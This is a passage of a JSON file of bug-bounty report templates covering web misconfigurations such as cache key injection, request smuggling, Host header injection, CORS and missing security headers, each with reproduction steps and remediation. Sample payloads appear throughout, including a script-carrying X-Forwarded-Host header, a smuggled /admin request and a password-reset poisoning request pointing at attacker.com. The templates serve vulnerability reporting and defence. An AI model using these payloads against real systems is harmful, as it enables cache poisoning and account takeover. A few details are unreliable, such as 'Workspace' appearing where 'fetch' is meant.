                    "4. **[Scenario C: Missing/Weak SameSite Attribute]**",
                    "   a. Check if session cookies lack the `SameSite` attribute or if it's set to `None` without the `Secure` flag.",
                    "   b. **[What happened]**: The cookie is vulnerable to CSRF attacks (if `SameSite` is missing/Lax for sensitive POSTs) or cross-site leakage (if `SameSite=None` without `Secure`).",
                    "   c. **[What should happen]**: `SameSite=Lax` (default in modern browsers) or `SameSite=Strict` should be used for session cookies to mitigate CSRF.",
                    "5. **[Scenario D: Predictable Cookie Values (already covered under 'Weak Token Generation')]**",
                    "   a. If cookie values are sequential or easily guessable, they can be brute-forced or predicted for session hijacking.",
                    "6. **[Scenario E: Excessive Cookie Lifetime]**",
                    "   a. Check the `Expires` or `Max-Age` attribute of session cookies. If it's set for a very long duration (e.g., months, years).",
                    "   b. **[What happened]**: The session remains valid for an excessively long time, increasing the window for session hijacking if the cookie is stolen.",
                    "   c. **[What should happen]**: Session cookies should have reasonable expiration times, ideally tied to inactivity and absolute timeouts."
                  ],
                  "proof_of_concept": {
                    "cookie_header_example": "Set-Cookie: sessionid=ABCD123; Path=/; Expires=Tue, 27 May 2026 12:00:00 GMT;",
                    "notes": "Provide screenshots of the browser's developer tools showing the cookie attributes (or lack thereof). Explain how the missing flag or insecure setting makes the cookie vulnerable (e.g., '`sessionid` is missing `HttpOnly`, allowing `document.cookie` to read it')."
                  },
                  "impact": "Session hijacking, leading to account takeover. Sensitive data exposure. Man-in-the-Middle attacks. Cross-Site Request Forgery (CSRF). This undermines authentication and session management security.",
                  "remediation_suggestion": "Set `HttpOnly` for all session and sensitive cookies to prevent client-side JavaScript access. Set `Secure` for all session and sensitive cookies to ensure they are only transmitted over HTTPS. Implement `SameSite=Lax` (default for most browsers) or `SameSite=Strict` for session cookies to mitigate CSRF attacks. Use strong, unpredictable session IDs. Implement reasonable session expiration policies (inactivity and absolute timeouts). Regenerate session IDs after authentication."
                },
                {
                  "vulnerability_name": "Cache Key Injection",
                  "summary": "Cache Key Injection is a specific type of Cache Poisoning where an attacker manipulates parameters (e.g., HTTP headers, query parameters) that are used to form the cache key by a web cache (CDN, proxy). By injecting malicious values into these parameters, the attacker can cause the cache to store and serve arbitrary, malicious content to other users.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., cdn.example.com]",
                  "url_location": "[Any endpoint served by a cache, e.g., https://cdn.example.com/assets/main.css]",
                  "steps_to_reproduce": [
                    "1. Identify an application that uses a web cache (CDN, reverse proxy).",
                    "2. Identify a parameter (header or query) that influences the application's response but is *not* intended to be part of the cache key, or is handled inconsistently by the cache vs. backend.",
                    "3. **[Scenario A: Unkeyed Header Injection]**",
                    "   a. The application uses a `X-Forwarded-Host` header to generate absolute URLs in the response, but the cache does not include this header in its cache key.",
                    "   b. Send a request to a cacheable resource (e.g., `main.css`) with a malicious `X-Forwarded-Host` header (e.g., `X-Forwarded-Host: attacker.com`).",
                    "   c. **[What happened]**: The application generates a response with URLs pointing to `attacker.com`. The cache stores this response under the original URL (e.g., `main.css`). Subsequent users requesting `main.css` receive the poisoned response, leading to XSS or redirection.",
                    "   d. **[What should happen]**: All headers that influence the response should be included in the cache key, or their values should be strictly validated/sanitized.",
                    "4. **[Scenario B: Unkeyed Query Parameter Injection]**",
                    "   a. The application uses a query parameter (e.g., `?redirect_to=`) but the cache ignores it in the cache key.",
                    "   b. Send a request like `/?redirect_to=javascript:alert(1)` to a cacheable page.",
                    "   c. **[What happened]**: The cache stores the response. Other users requesting `/` receive the poisoned response, leading to XSS.",
                    "   d. **[What should happen]**: All query parameters that influence the response should be part of the cache key.",
                    "5. **[Scenario C: HTTP Parameter Ambiguity (already covered, but can lead to Cache Key Injection)]**",
                    "   a. If the proxy/CDN and backend parse duplicate parameters differently, it can lead to the cache storing one version while the backend processes another, resulting in poisoning."
                  ],
                  "proof_of_concept": {
                    "request_example": "GET /assets/main.css HTTP/1.1\nHost: cdn.example.com\nX-Forwarded-Host: attacker.com<script>alert(document.domain)</script>",
                    "notes": "Provide the exact request used, highlighting the injected header/parameter. Show the HTTP response headers and body, demonstrating the malicious content. Show evidence that the cache was poisoned (e.g., subsequent requests from other browsers/incognito windows receive the malicious content). A video demonstrating the poisoning and subsequent victim access is highly effective."
                  },
                  "impact": "Widespread Cross-Site Scripting (XSS) affecting all users served by the cache. Website defacement. Redirection to malicious sites. Can lead to session hijacking or other client-side attacks. This is a severe vulnerability due to its potential to affect many users.",
                  "remediation_suggestion": "Ensure that all parameters (headers, query parameters, cookies) that can influence the application's response are explicitly included in the cache key. Implement strict input validation and encoding for all user-supplied input that might be reflected in a cached response. Configure caches to normalize requests (e.g., sort query parameters, remove irrelevant headers) before generating cache keys. Disable caching for pages that reflect untrusted input or contain sensitive data. Use a Web Application Firewall (WAF) to filter malicious input before it reaches the cache."
                },
                {
                  "vulnerability_name": "Private Data Caching",
                  "summary": "Private Data Caching occurs when an application or its caching infrastructure (e.g., CDN, proxy, browser) mistakenly caches sensitive, user-specific data (e.g., PII, account details, session tokens) in a shared or public cache. This can lead to the exposure of one user's private information to other users.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., cdn.example.com]",
                  "url_location": "[Full URL of the page with sensitive data, e.g., https://cdn.example.com/user/profile]",
                  "steps_to_reproduce": [
                    "1. Log in as User A and navigate to a page containing sensitive, user-specific data (e.g., `/user/profile`, `/my_orders`).",
                    "2. Inspect the HTTP response headers for this page, specifically the `Cache-Control` header.",
                    "3. **[Scenario A: Missing `Cache-Control: private` or `no-store`]**",
                    "   a. **[What happened]**: The `Cache-Control` header is missing, or set to `public`, `max-age`, or `s-maxage` without `private` or `no-store`. This allows intermediate proxies or shared caches (like CDNs) to store User A's sensitive content.",
                    "   b. **[What should happen]**: Sensitive content should be served with `Cache-Control: no-store, no-cache, must-revalidate, private` to prevent caching by any intermediary or browser.",
                    "4. **[Scenario B: Insufficient Cache Key for Private Data]**",
                    "   a. Even if `Cache-Control: private` is set, if the cache key doesn't include unique user identifiers (e.g., session ID, user ID), the cache might still store it based on a common URL.",
                    "   b. **[What happened]**: User A's profile is cached under `/user/profile`. When User B requests `/user/profile` (even if they are a different user), they receive User A's cached profile.",
                    "   c. **[What should happen]**: Cache keys for private content must include unique user identifiers.",
                    "5. **[Scenario C: Cache Deception (already covered, but a form of private data caching)]**",
                    "   a. An attacker tricks the cache into storing a victim's sensitive data under a public URL, which the attacker can then access."
                  ],
                  "proof_of_concept": {
                    "response_header_example": "HTTP/1.1 200 OK\nContent-Type: text/html\nCache-Control: public, max-age=3600",
                    "notes": "Provide the URL of the page containing sensitive data. Show the HTTP response headers for that page, highlighting the problematic `Cache-Control` directive. Demonstrate (e.g., with two different authenticated users, or by logging out and accessing from another browser) that User B can access User A's sensitive cached data. A video showing this is highly effective."
                  },
                  "impact": "Sensitive data exposure (e.g., PII, financial details, personal communications) of one user to other users. This leads to severe privacy violations, identity theft, and significant reputational damage. It violates the core principle of data isolation between users.",
                  "remediation_suggestion": "Implement strict `Cache-Control` headers for all pages containing sensitive, user-specific data. Always use `Cache-Control: no-store, no-cache, must-revalidate, private` for such content. Ensure that CDNs and proxies are configured to respect these headers and never cache private content. If caching is absolutely necessary for performance, ensure the cache key includes a unique identifier for the user (e.g., session ID, user ID) to prevent cross-user leakage."
                },
                {
                  "vulnerability_name": "Abusing hop-by-hop headers",
                  "summary": "Abusing hop-by-hop headers involves manipulating HTTP headers that are intended for single-hop communication (e.g., `Connection`, `Keep-Alive`, `Proxy-Authenticate`, `Transfer-Encoding`) between proxies and the server. This can lead to HTTP Request Smuggling, bypassing security controls, or information disclosure.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., proxy.example.com]",
                  "url_location": "[Any endpoint processed by a proxy, e.g., https://proxy.example.com/api/data]",
                  "steps_to_reproduce": [
                    "1. Identify an application that uses a reverse proxy or CDN in front of the backend server.",
                    "2. **[Scenario A: HTTP Request Smuggling (via `Transfer-Encoding` / `Content-Length` ambiguity)]**",
                    "   a. (This is a primary impact of abusing hop-by-hop headers, specifically `Transfer-Encoding` and `Content-Length`). If the proxy and backend interpret these headers differently, an attacker can 'smuggle' a second, malicious request within a single HTTP request.",
                    "   b. Example: Send a request with both `Content-Length` and `Transfer-Encoding: chunked` headers, where the proxy uses `Content-Length` and the backend uses `Transfer-Encoding`. The smuggled request can then bypass WAFs, access internal endpoints, or poison caches.",
                    "   c. **[What happened]**: The smuggled request is processed by the backend, leading to unauthorized actions or information disclosure.",
                    "   d. **[What should happen]**: Proxies and backends should handle `Transfer-Encoding` and `Content-Length` consistently, or normalize requests.",
                    "3. **[Scenario B: Bypassing Security Headers/Controls]**",
                    "   a. Some security controls (e.g., WAF rules, logging) might not properly process requests if certain hop-by-hop headers are present or malformed.",
                    "   b. Inject a hop-by-hop header (e.g., `Connection: close, X-Custom-Header`) with a malicious payload in `X-Custom-Header`.",
                    "   c. **[What happened]**: The malicious payload bypasses a WAF rule that doesn't inspect the `X-Custom-Header` when `Connection: close` is present.",
                    "   d. **[What should happen]**: Security controls should be robust to all header permutations.",
                    "4. **[Scenario C: Information Disclosure]**",
                    "   a. Some proxies might reveal internal information in response to specific hop-by-hop headers (e.g., `Proxy-Connection`).",
                    "   b. **[What happened]**: The proxy reveals its internal IP address or version information."
                  ],
                  "proof_of_concept": {
                    "request_example": "POST / HTTP/1.1\nHost: proxy.example.com\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: proxy.example.com\n\n",
                    "notes": "Provide the exact HTTP request demonstrating the abuse of hop-by-hop headers. Show the response from the server, indicating the successful bypass or information disclosure. Explain the specific header being abused and its effect."
                  },
                  "impact": "HTTP Request Smuggling, leading to bypassing security controls (WAFs, authentication), cache poisoning, and access to internal resources. Information disclosure about network topology. Can lead to severe system compromise and data breaches.",
                  "remediation_suggestion": "Ensure consistent handling of HTTP headers, especially `Transfer-Encoding` and `Content-Length`, across all layers of the application stack (proxy, web server, application server). Normalize requests by removing hop-by-hop headers before forwarding them to the backend. Use a robust WAF that is aware of HTTP smuggling techniques. Regularly update and patch web servers and proxies to address known vulnerabilities."
                },
                {
                  "vulnerability_name": "Missing or Weak Security Headers",
                  "summary": "Missing or Weak Security Headers indicates that an application fails to implement or incorrectly configures crucial HTTP security headers. These headers provide client-side protections against common attacks like XSS, Clickjacking, and insecure data transmission, and their absence weakens the overall security posture.",
                  "severity": "Low",
                  "target": "[Specify affected asset, e.g., web.example.com]",
                  "url_location": "[Any page served by the application, e.g., https://web.example.com/]",
                  "steps_to_reproduce": [
                    "1. Navigate to various pages of the application (especially sensitive ones) and inspect the HTTP response headers (browser developer tools -> Network tab, or `curl -I`).",
                    "2. **[Scenario A: Missing `X-Frame-Options`]**",
                    "   a. Check if the `X-Frame-Options` header is missing or set to `ALLOW-FROM` with a broad origin.",
                    "   b. **[What happened]**: The page can be embedded in an `<iframe>` on an external domain, making it vulnerable to Clickjacking.",
                    "   c. **[What should happen]**: Set `X-Frame-Options: DENY` or `SAMEORIGIN`.",
                    "3. **[Scenario B: Missing `Strict-Transport-Security` (HSTS)]**",
                    "   a. Check if the `Strict-Transport-Security` header is missing.",
                    "   b. **[What happened]**: The browser might connect over HTTP first, making it vulnerable to SSL stripping attacks (downgrading to HTTP) by a Man-in-the-Middle.",
                    "   c. **[What should happen]**: Implement HSTS with a sufficient `max-age` and `includeSubDomains`.",
                    "4. **[Scenario C: Missing `X-Content-Type-Options`]**",
                    "   a. Check if the `X-Content-Type-Options` header is missing.",
                    "   b. **[What happened]**: Browsers might perform MIME sniffing, potentially interpreting a user-uploaded image as an executable script, leading to XSS.",
                    "   c. **[What should happen]**: Set `X-Content-Type-Options: nosniff`.",
                    "5. **[Scenario D: Missing `Content-Security-Policy` (CSP)]**",
                    "   a. Check if the `Content-Security-Policy` header is missing or is too permissive (`default-src *`).",
                    "   b. **[What happened]**: The application lacks a strong defense against XSS and other content injection attacks.",
                    "   c. **[What should happen]**: Implement a strict CSP to whitelist trusted sources for content.",
                    "6. **[Scenario E: Missing `Referrer-Policy`]**",
                    "   a. Check if the `Referrer-Policy` header is missing.",
                    "   b. **[What happened]**: The full URL (including sensitive parameters) might be leaked in the `Referer` header to third-party sites.",
                    "   c. **[What should happen]**: Set a restrictive `Referrer-Policy` (e.g., `no-referrer`, `same-origin`)."
                  ],
                  "proof_of_concept": {
                    "response_header_example": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n",
                    "notes": "Provide the URL of the affected page. Show the HTTP response headers (e.g., screenshot from developer tools or `curl -I` output) clearly indicating the missing or weak header. Explain the specific security implication of each missing/weak header (e.g., 'Absence of X-Frame-Options makes this page vulnerable to Clickjacking')."
                  },
                  "impact": "Reduced client-side protection against common web vulnerabilities. Increases the likelihood and impact of attacks like XSS, Clickjacking, SSL stripping, and information leakage. Weakens the overall security posture and can lead to compliance issues.",
                  "remediation_suggestion": "Implement all recommended HTTP security headers with appropriate, strict values. This includes: `X-Frame-Options: DENY` (or `SAMEORIGIN`), `Strict-Transport-Security` (HSTS), `X-Content-Type-Options: nosniff`, `Content-Security-Policy` (strict), `Referrer-Policy` (e.g., `no-referrer-when-downgrade` or `same-origin`), and `X-XSS-Protection: 0` (if CSP is used, otherwise `1; mode=block`). Configure these headers at the web server (Nginx, Apache) or application framework level."
                },
                {
                  "vulnerability_name": "Referrer Policy Misconfigurations",
                  "summary": "Referrer Policy Misconfigurations occur when the `Referrer-Policy` HTTP header is incorrectly set or missing, leading to the unintended leakage of sensitive information (e.g., full URLs with tokens, session IDs, private paths) in the `Referer` header when navigating to external websites.",
                  "severity": "Low",
                  "target": "[Specify affected asset, e.g., portal.example.com]",
                  "url_location": "[Any page that might contain sensitive data in its URL, e.g., https://portal.example.com/user/settings?token=ABC123]",
                  "steps_to_reproduce": [
                    "1. Navigate to a page on the application that contains sensitive information in its URL (e.g., query parameters, unique paths). Example: `https://portal.example.com/user/settings?token=ABC123`.",
                    "2. Inspect the HTTP response headers for this page, looking for the `Referrer-Policy` header. Note if it's missing or set to a permissive value (e.g., `unsafe-url`, `origin-when-cross-origin`).",
                    "3. From this sensitive page, click on an external link (e.g., an advertisement, a link to a social media site, or a link to an attacker-controlled domain).",
                    "4. On the external (attacker-controlled) server, inspect the incoming HTTP request's `Referer` header.",
                    "5. **[What happened]**: The `Referer` header contains the full URL of the previous page, including the sensitive `token=ABC123` parameter, which is leaked to the external domain.",
                    "6. **[What should happen]**: The `Referrer-Policy` should be set to a restrictive value (e.g., `no-referrer`, `same-origin`, or `strict-origin-when-cross-origin`) to prevent sensitive URL leakage.",
                    "7. **[Scenario B: Leakage to Subdomains]**",
                    "   a. If the policy is `origin`, the full origin is sent to subdomains. If a subdomain is compromised, it can still receive sensitive `Referer` headers."
                  ],
                  "proof_of_concept": {
                    "response_header_example": "HTTP/1.1 200 OK\nContent-Type: text/html\nReferrer-Policy: no-referrer-when-downgrade",
                    "notes": "Provide the URL of the sensitive page. Show the HTTP response headers for that page, highlighting the `Referrer-Policy` (or its absence). Provide a screenshot of the attacker's server logs showing the leaked `Referer` header containing the sensitive information. Explain the sensitive data that was leaked."
                  },
                  "impact": "Sensitive data leakage (e.g., authentication tokens, session IDs, internal paths, user IDs, PII) to third-party websites or analytics services. This can lead to session hijacking, account takeover, targeted phishing, or privacy violations. It provides attackers with valuable reconnaissance.",
                  "remediation_suggestion": "Implement a strict `Referrer-Policy` HTTP header on all pages, especially those containing sensitive data in their URLs. Recommended policies: `no-referrer` (most restrictive), `same-origin` (only send referrer for same-origin requests), or `strict-origin-when-cross-origin` (send full URL for same-origin, origin only for cross-origin HTTPS, no referrer for cross-origin HTTP). Avoid putting sensitive data in URLs in the first place."
                },
                {
                  "vulnerability_name": "No XSS Filter / XSS Protection Header Missing",
                  "summary": "The absence of the `X-XSS-Protection` HTTP header (or its incorrect configuration) indicates a lack of a basic, client-side XSS filter. While not a primary defense, its absence means the browser's built-in XSS auditor is not enabled, potentially allowing some simple reflected XSS attacks to succeed.",
                  "severity": "Informational",
                  "target": "[Specify affected asset, e.g., web.example.com]",
                  "url_location": "[Any page served by the application, e.g., https://web.example.com/search]",
                  "steps_to_reproduce": [
                    "1. Navigate to any page of the application and inspect the HTTP response headers (browser developer tools -> Network tab, or `curl -I`).",
                    "2. **[What happened]**: The `X-XSS-Protection` header is missing, or it is set to `0` (disabling the filter).",
                    "3. **[What should happen]**: While modern browsers increasingly deprecate or disable this header in favor of CSP, its presence (set to `1; mode=block`) historically provided a basic layer of defense against reflected XSS. If CSP is not strictly implemented, this header can still offer some value.",
                    "4. (Optional) Try a simple reflected XSS payload (e.g., `search=<script>alert(1)</script>`). If the header is missing, the browser might execute it where it would have been blocked with the header present."
                  ],
                  "proof_of_concept": {
                    "response_header_example": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n",
                    "notes": "Provide the URL of the affected page. Show the HTTP response headers (e.g., screenshot from developer tools) clearly indicating the absence or incorrect value of the `X-XSS-Protection` header. Explain that this is a defense-in-depth header and its primary replacement is a strong Content Security Policy."
                  },
                  "impact": "Reduced client-side protection against reflected Cross-Site Scripting (XSS) attacks. While not a standalone vulnerability, its absence makes the application more susceptible to XSS if other XSS prevention measures (like proper output encoding or CSP) are insufficient.",
                  "remediation_suggestion": "Implement a robust Content Security Policy (CSP) as the primary defense against XSS. If a strict CSP is in place, the `X-XSS-Protection` header can be set to `0` (disabled) to avoid conflicts. If CSP is not yet fully implemented, consider setting `X-XSS-Protection: 1; mode=block` as a temporary, defense-in-depth measure. However, focus on fundamental XSS prevention (output encoding, input validation) and a strong CSP."
                },
                {
                  "vulnerability_name": "Host Header Injection",
                  "summary": "Host Header Injection allows an attacker to manipulate the `Host` HTTP header in a request, tricking the application into generating absolute URLs or performing actions based on an attacker-controlled domain. This can lead to password reset poisoning, web cache poisoning, or redirection to malicious sites.",
                  "severity": "Medium",
                  "target": "[Specify affected asset, e.g., auth.example.com]",
                  "url_location": "[Any endpoint where the Host header is used to construct URLs, e.g., https://auth.example.com/forgot_password]",
                  "steps_to_reproduce": [
                    "1. Identify an endpoint where the application constructs absolute URLs (e.g., password reset links, email verification links, redirection URLs, canonical URLs in meta tags).",
                    "2. **[Scenario A: Password Reset Poisoning]**",
                    "   a. Initiate a password reset request for a victim's account.",
                    "   b. Intercept the request and modify the `Host` header to an attacker-controlled domain (e.g., `Host: attacker.com`).",
                    "   c. **[What happened]**: The password reset link sent to the victim's email contains the attacker-controlled domain (`http://attacker.com/reset?token=...`). If the victim clicks this link, their reset token is sent to the attacker's server, allowing account takeover.",
                    "   d. **[What should happen]**: The application should strictly validate and whitelist the `Host` header, or construct reset links using a fixed, hardcoded domain.",
                    "3. **[Scenario B: Web Cache Poisoning]**",
                    "   a. (Already covered under Cache Key Injection) If the `Host` header is used in the cache key or influences the response but is not properly validated, it can lead to cache poisoning.",
                    "   b. Send a request to a cacheable resource with a malicious `Host` header.",
                    "   c. **[What happened]**: The cache stores the response with the malicious `Host` header, and subsequent users receive the poisoned response.",
                    "4. **[Scenario C: Redirection to Malicious Site]**",
                    "   a. If the application uses the `Host` header to construct redirection URLs.",
                    "   b. Manipulate the `Host` header to redirect to an attacker-controlled domain.",
                    "   c. **[What happened]**: The application redirects the user to the malicious site.",
                    "   d. **[What should happen]**: Redirection URLs should be based on trusted, hardcoded values or strictly whitelisted."
                  ],
                  "proof_of_concept": {
                    "request_example": "POST /forgot_password HTTP/1.1\nHost: attacker.com\nContent-Type: application/x-www-form-urlencoded\n\nemail=victim@example.com",
                    "email_content_example": "Click here to reset your password: http://attacker.com/reset?token=XYZ123",
                    "notes": "Provide the exact request with the manipulated `Host` header. Show the resulting email content or the HTTP response headers (for redirects/cache poisoning) demonstrating the injection. Screenshots of the email or the redirected page."
                  },
                  "impact": "Account takeover (via password reset poisoning). Web cache poisoning, leading to widespread XSS or defacement. Redirection to phishing sites. Can bypass security controls that rely on the `Host` header for origin validation.",
                  "remediation_suggestion": "Strictly validate the `Host` header against an allowlist of legitimate domains. If the `Host` header is used to construct absolute URLs, ensure it's always derived from a trusted, hardcoded configuration value, not directly from user input. For password reset and verification links, use a fixed, hardcoded domain. Configure web servers/proxies to reject requests with unrecognized `Host` headers."
                },
                {
                  "vulnerability_name": "Missing or Incorrect CORS Headers",
                  "summary": "Missing or Incorrect Cross-Origin Resource Sharing (CORS) headers allow an attacker to make unauthorized cross-origin requests from a malicious domain to a vulnerable application. This can lead to sensitive data disclosure, bypassing CSRF protections, or unauthorized actions on behalf of the victim.",
                  "severity": "Medium",
                  "target": "[Specify affected asset, e.g., api.example.com]",
                  "url_location": "[Full URL of the vulnerable endpoint, e.g., https://api.example.com/user/profile]",
                  "steps_to_reproduce": [
                    "1. Identify an API endpoint that handles sensitive data or actions (e.g., `/user/profile`, `/transfer_funds`).",
                    "2. Send an `OPTIONS` (preflight) request or a simple `GET`/`POST` request from an attacker-controlled domain (e.g., `attacker.com`) to the target API endpoint. Include the `Origin` header with your malicious domain: `Origin: https://attacker.com`.",
                    "3. **[Scenario A: Wildcard Origin (`Access-Control-Allow-Origin: *`)]**",
                    "   a. **[What happened]**: The server responds with `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`. This allows any origin to make credentialed requests, leading to data leakage or CSRF bypass.",
                    "   b. **[What should happen]**: If `Access-Control-Allow-Credentials: true` is present, `Access-Control-Allow-Origin` *must not* be `*`.",
                    "4. **[Scenario B: Reflected Origin (e.g., `Access-Control-Allow-Origin: https://attacker.com`)]**",
                    "   a. The server reflects the `Origin` header's value back in `Access-Control-Allow-Origin`.",
                    "   b. **[What happened]**: An attacker can control the origin, allowing cross-origin requests. Example: `Origin: https://attacker.com.example.com` or `Origin: https://attacker.com`.",
                    "   c. **[What should happen]**: The server should validate the `Origin` header against a strict whitelist of allowed domains.",
                    "5. **[Scenario C: Null Origin Allowed]**",
                    "   a. Send a request with `Origin: null` (e.g., from a local file, sandbox, or `data:` URL).",
                    "   b. **[What happened]**: The server responds with `Access-Control-Allow-Origin: null`, allowing cross-origin requests from these contexts.",
                    "   c. **[What should happen]**: `null` origin should rarely be allowed, only if explicitly required and understood.",
                    "6. **[Scenario D: Unvalidated Headers/Methods]**",
                    "   a. The `Access-Control-Allow-Headers` or `Access-Control-Allow-Methods` headers are overly permissive or reflect arbitrary values.",
                    "   b. **[What happened]**: This could allow an attacker to inject custom headers (e.g., authentication tokens) or use methods not intended for public access.",
                    "7. After identifying a misconfiguration, demonstrate data retrieval/action execution via an attacker-controlled page (e.g., a JavaScript file with `Workspace` or `XMLHttpRequest` on `attacker.com`)."
                  ],
                  "proof_of_concept": {
                    "request_example": "OPTIONS /user/profile HTTP/1.1\nHost: api.example.com\nOrigin: https://attacker.com\nAccess-Control-Request-Method: GET\nAccess-Control-Request-Headers: X-Requested-With",
                    "response_example": "HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://attacker.com\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\nAccess-Control-Allow-Headers: Content-Type, X-Requested-With",
                    "notes": "Provide the exact HTTP request and response headers demonstrating the misconfiguration. Show the JavaScript code on the attacker's site that successfully makes a cross-origin request to the vulnerable endpoint and retrieves sensitive data or performs an action (e.g., a screenshot of data appearing in the attacker's console). Clearly state the misconfigured header and its implications."
                  },
                  "impact": "Bypassing Same-Origin Policy, leading to: sensitive data exposure (e.g., PII, session data, internal API responses), unauthorized actions (e.g., fund transfers, profile updates) via CSRF bypass, and potential for web-based malware distribution. Can lead to account takeover.",
                  "remediation_suggestion": "Implement a strict whitelist for `Access-Control-Allow-Origin`. Only allow origins that are absolutely necessary. Never use `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`. Avoid reflecting the `Origin` header directly. Restrict `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers` to only the necessary values. Understand and securely configure CORS for preflight requests. If credentials are not needed, avoid `Access-Control-Allow-Credentials: true`."
                },
                {
                  "vulnerability_name": "Weak/Missing CSP (Beyond bypass)",
                  "summary": "A weak or missing Content Security Policy (CSP) fails to provide effective client-side protection against Cross-Site Scripting (XSS), data injection, and other content injection attacks. This is due to either the complete absence of the header or a policy that is too permissive, allowing attackers to bypass its controls.",
                  "severity": "Medium",
                  "target": "[Specify affected asset, e.g., app.example.com]",
                  "url_location": "[Any page served by the application, e.g., https://app.example.com/]",
                  "steps_to_reproduce": [
                    "1. Navigate to the application and inspect the HTTP response headers. Check for the `Content-Security-Policy` header.",
                    "2. **[Scenario A: CSP is missing]**",
                    "   a. **[What happened]**: No `Content-Security-Policy` header is present. The browser will not enforce any content security rules.",
                    "   b. **[What should happen]**: A robust CSP should be implemented to mitigate XSS and other client-side attacks.",
                    "3. **[Scenario B: CSP is too permissive (e.g., `default-src *`)]**",
                    "   a. **[What happened]**: The CSP is present but allows content from any origin (`*` directive) or uses `unsafe-inline`/`unsafe-eval` for scripts. This effectively neutralizes its protective capabilities against XSS.",
                    "   b. **[What should happen]**: Directives should be as strict as possible, whitelisting only trusted sources. `unsafe-inline` and `unsafe-eval` should be avoided.",
                    "4. **[Scenario C: Missing `object-src`, `base-uri`, `frame-ancestors` directives]**",
                    "   a. **[What happened]**: While `script-src` might be strict, other critical directives are missing, leaving the application vulnerable to Clickjacking (via `frame-ancestors`), data exfiltration (via `base-uri`), or plugin-based attacks (`object-src`).",
                    "   b. **[What should happen]**: A comprehensive CSP should include directives for all relevant resource types.",
                    "5. (Optional) Attempt to execute a basic XSS payload on a page with a weak/missing CSP (e.g., reflect `alert(1)` in user input) to demonstrate its ineffectiveness.",
                    "   a. **[What happened]**: The `alert` box appears, indicating the XSS was not blocked by CSP."
                  ],
                  "proof_of_concept": {
                    "response_header_example": "HTTP/1.1 200 OK\nContent-Type: text/html\nContent-Security-Policy: default-src *; script-src 'unsafe-inline' 'self'",
                    "notes": "Provide the URL of the affected page. Show the HTTP response headers, specifically the `Content-Security-Policy` header. Explain why the policy is weak or missing (e.g., 'The CSP uses `unsafe-inline` allowing arbitrary script execution'). If possible, demonstrate a simple XSS payload bypassing the CSP with a screenshot of the `alert` box or injected content."
                  },
                  "impact": "Increased vulnerability to Cross-Site Scripting (XSS) attacks, data injection, and other client-side content injection attacks. Allows attackers to steal session cookies, deface websites, redirect users, or perform actions on behalf of the victim. Undermines defense-in-depth.",
                  "remediation_suggestion": "Implement a strong and granular Content Security Policy. Use 'nonce-based' or 'hash-based' CSPs to avoid `unsafe-inline`. Whitelist only trusted domains for all directives (e.g., `script-src`, `style-src`, `img-src`, `font-src`, `connect-src`). Include directives like `object-src 'none'`, `base-uri 'self'`, `frame-ancestors 'self'` to prevent Clickjacking and other attacks. Use `report-uri` or `report-to` to monitor CSP violations in a production environment. Continuously refine the CSP to be as restrictive as possible."
                },
                {
                  "vulnerability_name": "Strict-Transport-Security (HSTS) Missing/Misconfigured",
                  "summary": "Missing or misconfigured HTTP Strict Transport Security (HSTS) header leaves an application vulnerable to SSL stripping attacks (downgrading connections from HTTPS to HTTP) and cookie hijacking. This allows an attacker to intercept sensitive data or session cookies if the user initially connects via HTTP.",
                  "severity": "Medium",
                  "target": "[Specify affected asset, e.g., login.example.com]",
                  "url_location": "[Full URL of the application, e.g., https://login.example.com/]",
                  "steps_to_reproduce": [
                    "1. Access the application's website. Ensure you are trying to access it via HTTPS.",
                    "2. Inspect the HTTP response headers for the `Strict-Transport-Security` header.",
                    "3. **[Scenario A: HSTS Header is Missing]**",
                    "   a. **[What happened]**: The `Strict-Transport-Security` header is not present in the response.",
                    "   b. **[What should happen]**: HSTS should be implemented to enforce HTTPS-only connections.",
                    "4. **[Scenario B: HSTS `max-age` is too low]**",
                    "   a. **[What happened]**: The `max-age` directive is set to a very short duration (e.g., `max-age=0` or a few seconds). This means the HSTS policy quickly expires, offering minimal protection.",
                    "   b. **[What should happen]**: `max-age` should be set to a long duration (e.g., `31536000` for one year or more).",
                    "5. **[Scenario C: Missing `includeSubDomains` directive]**",
                    "   a. **[What happened]**: The `includeSubDomains` directive is missing. This means the HSTS policy only applies to the main domain, leaving subdomains vulnerable to SSL stripping.",
                    "   b. **[What should happen]**: For comprehensive protection, `includeSubDomains` should be included if all subdomains also support HTTPS.",
                    "6. **[Scenario D: Site not preloaded]**",
                    "   a. **[What happened]**: The `preload` directive is missing, and the domain is not in the HSTS preload list. This means the very first connection is still vulnerable to SSL stripping.",
                    "   b. **[What should happen]**: Consider submitting the domain to the HSTS preload list for maximum security (after ensuring full HTTPS coverage)."
                  ],
                  "proof_of_concept": {
                    "response_header_example": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n",
                    "notes": "Provide the URL of the affected page. Show the HTTP response headers (e.g., screenshot from developer tools or `curl -I` output) clearly indicating the missing or misconfigured HSTS header. Explain how this weakness makes the application vulnerable to SSL stripping, especially on the first visit, or for subdomains."
                  },
                  "impact": "SSL stripping attacks (HTTPS to HTTP downgrade), leading to man-in-the-middle attacks, sensitive data interception (credentials, session cookies), and session hijacking. Weakens the overall security posture and trustworthiness of the application's encrypted communications.",
                  "remediation_suggestion": "Implement the `Strict-Transport-Security` header with a strong configuration. It should be served only over HTTPS. Recommended: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`. The `preload` directive requires submission to the HSTS preload list (only after fully validating all subdomains support HTTPS). Ensure all HTTP traffic is redirected to HTTPS at the earliest possible point (e.g., load balancer or web server)."
                },
                {
                  "vulnerability_name": "X-Frame-Options Missing/Misconfigured",
                  "summary": "Missing or misconfigured `X-Frame-Options` HTTP header allows an attacker to embed the application's web pages within an `<iframe>`, `<frame>`, or `<object>` on a malicious website. This is a prerequisite for Clickjacking attacks, where users are tricked into clicking invisible elements on the vulnerable page.",
                  "severity": "Medium",
